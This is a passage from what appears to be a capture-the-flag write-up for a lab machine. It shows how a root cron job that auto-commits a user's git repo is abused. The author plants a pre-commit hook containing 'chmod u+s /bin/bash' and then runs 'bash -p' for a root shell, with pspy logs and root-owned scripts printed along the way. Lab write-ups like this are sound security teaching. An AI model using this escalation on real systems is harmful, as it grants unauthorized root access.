2022/07/27 05:23:01 CMD: UID=0    PID=14089  | /usr/lib/git-core/git gc --auto
2022/07/27 05:23:01 CMD: UID=0    PID=14090  | git push origin main
2022/07/27 05:23:01 CMD: UID=0    PID=14091  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
2022/07/27 05:23:22 CMD: UID=0    PID=14094  |
2022/07/27 05:24:01 CMD: UID=0    PID=14111  | /bin/sh -c /usr/local/bin/git-sync
2022/07/27 05:24:01 CMD: UID=0    PID=14110  | /usr/sbin/CRON -f
2022/07/27 05:24:01 CMD: UID=???  PID=14109  | ???
2022/07/27 05:24:01 CMD: UID=0    PID=14108  | /bin/sh -c /usr/local/bin/git-sync
2022/07/27 05:24:01 CMD: UID=0    PID=14107  |
2022/07/27 05:24:01 CMD: UID=0    PID=14106  | /usr/sbin/CRON -f
2022/07/27 05:24:01 CMD: UID=0    PID=14105  | /usr/sbin/CRON -f
2022/07/27 05:24:01 CMD: UID=0    PID=14104  | /usr/sbin/CRON -f
2022/07/27 05:24:01 CMD: UID=0    PID=14112  | git status --porcelain
2022/07/27 05:24:01 CMD: UID=0    PID=14113  | date +%Y-%m-%d
2022/07/27 05:24:01 CMD: UID=0    PID=14114  | git add .
2022/07/27 05:24:01 CMD: UID=0    PID=14115  | git commit -m Backup for 2022-07-27
2022/07/27 05:24:01 CMD: UID=0    PID=14116  | /bin/bash /root/meta/app/clean.sh
2022/07/27 05:24:01 CMD: UID=0    PID=14119  | cut -d  -f1
2022/07/27 05:24:01 CMD: UID=0    PID=14118  | /bin/bash /root/meta/app/clean.sh
2022/07/27 05:24:01 CMD: UID=0    PID=14117  | /bin/bash /root/meta/app/clean.sh
2022/07/27 05:24:01 CMD: UID=0    PID=14121  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
2022/07/27 05:24:01 CMD: UID=0    PID=14120  | git push origin main
2022/07/27 05:24:01 CMD: UID=0    PID=14127  |
```

The `home-backup` git repo (which is contained in our home directory) is committed to once per minute automatically by root:

```
(remote) dev01@opensource:/home/dev01$ git log
commit 34ef8a1f5355170e6815897b84e1d462541a623e (HEAD -> main)
Author: gituser <gituser@local>
Date:   Wed Jul 27 05:23:01 2022 +0000

    Backup for 2022-07-27

commit ceb41c744a7b31f70f7374c13a2f2da3b5903ed0
Author: gituser <gituser@local>
Date:   Wed Jul 27 05:22:01 2022 +0000

    Backup for 2022-07-27

commit 9b3976129243a8381fd7f06538418d3244522cb2
Author: gituser <gituser@local>
Date:   Wed Jul 27 04:53:01 2022 +0000

    Backup for 2022-07-27

commit dc049c6744b638f46c76571e5edf2f04c4924e56
Author: gituser <gituser@local>
Date:   Mon May 16 13:13:02 2022 +0000

    Backup for 2022-05-16

commit d4c5300aae7ad595bd2aeea1550ef7dac8c1c8cd (origin/main)
Author: gituser <gituser@local>
Date:   Mon May 16 12:50:01 2022 +0000

    Backup for 2022-05-16
```

We can get a hoot shell because of this thanks to [git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks). Git hooks are custom scripts that get executed "when certain important actions occur," such as a commit being made. The one we want to activate is `pre-commit`. Any commands we put in the file at `~/.git/hooks/pre-commit` will be run as root. So, activate the sample with `mv ~/.git/hooks/pre-commit.sample ~/.git/hooks/pre-commit` and then add the command `chmod u+s /bin/bash` near the top to make bash a SUID binary. Now, we just need to wait for a most 1 minute (you can see when it runs using pspy) and we will be able to simply run `bash` to get a root shell.

While I waited for the shell I noticed this in pspy as well:

```
2022/07/27 05:36:02 CMD: UID=0    PID=18771  | curl --write-out %{http_code} --silent --output /dev/null http://172.17.0.8
2022/07/27 05:36:02 CMD: UID=0    PID=18770  | /bin/bash /root/meta/app/clean.sh
2022/07/27 05:36:02 CMD: UID=0    PID=18774  | /bin/bash /root/meta/app/clean.sh
2022/07/27 05:36:02 CMD: UID=0    PID=18776  | cut -d  -f1
2022/07/27 05:36:02 CMD: UID=0    PID=18775  | /bin/bash /root/meta/app/clean.sh
```

That's probably the request we saw earlier in our shell and the `clean.sh` script probably reset the main upcloud site.

Anyway, after a minute passes, run `bash -p` to get a root shell! Then, get the `root.txt` flag with `cat /root/root.txt`.

Also, because I am curious:

```
(remote) root@opensource:/home/dev01# cat /root/meta/app/clean.sh
#!/bin/bash
#/snap/bin/docker container prune -f
for i in {6000..6007}
    do
        ip=$(/snap/bin/docker exec upcloud$i hostname -i | cut -d' ' -f1)
        output=$(curl --write-out %{http_code} --silent --output /dev/null http://$ip 2>/dev/null)
        echo $output
        if [[ "$output" -eq 000 ]];
        then
            /snap/bin/docker container stop upcloud$i
            /snap/bin/docker container prune -f
            /snap/bin/docker run -p 172.17.0.1:$i:80 --cap-drop=mknod -d --name=upcloud$i upcloud
        fi
    done
```

Also, we can see why port `3000` was filtered at the bottom of this file:

```
(remote) root@opensource:/home/dev01# cat /root/meta/start.sh
#!/bin/bash
/snap/bin/docker container prune -f
for i in {6000..6007}
    do
        /snap/bin/docker run -p 172.17.0.1:$i:80 --cap-drop=mknod -d --name=upcloud$i upcloud
    done

/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.0/0.0.0.7 -j  DNAT --to-destination 172.17.0.2:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.1/0.0.0.7 -j  DNAT --to-destination 172.17.0.3:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.2/0.0.0.7 -j  DNAT --to-destination 172.17.0.4:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.3/0.0.0.7 -j  DNAT --to-destination 172.17.0.5:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.4/0.0.0.7 -j  DNAT --to-destination 172.17.0.6:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.5/0.0.0.7 -j  DNAT --to-destination 172.17.0.7:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.6/0.0.0.7 -j  DNAT --to-destination 172.17.0.8:80
/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 80 -s 0.0.0.7/0.0.0.7 -j  DNAT --to-destination 172.17.0.9:80
/sbin/iptables -A INPUT -i eth0 -p tcp --destination-port 3000 -j DROP
```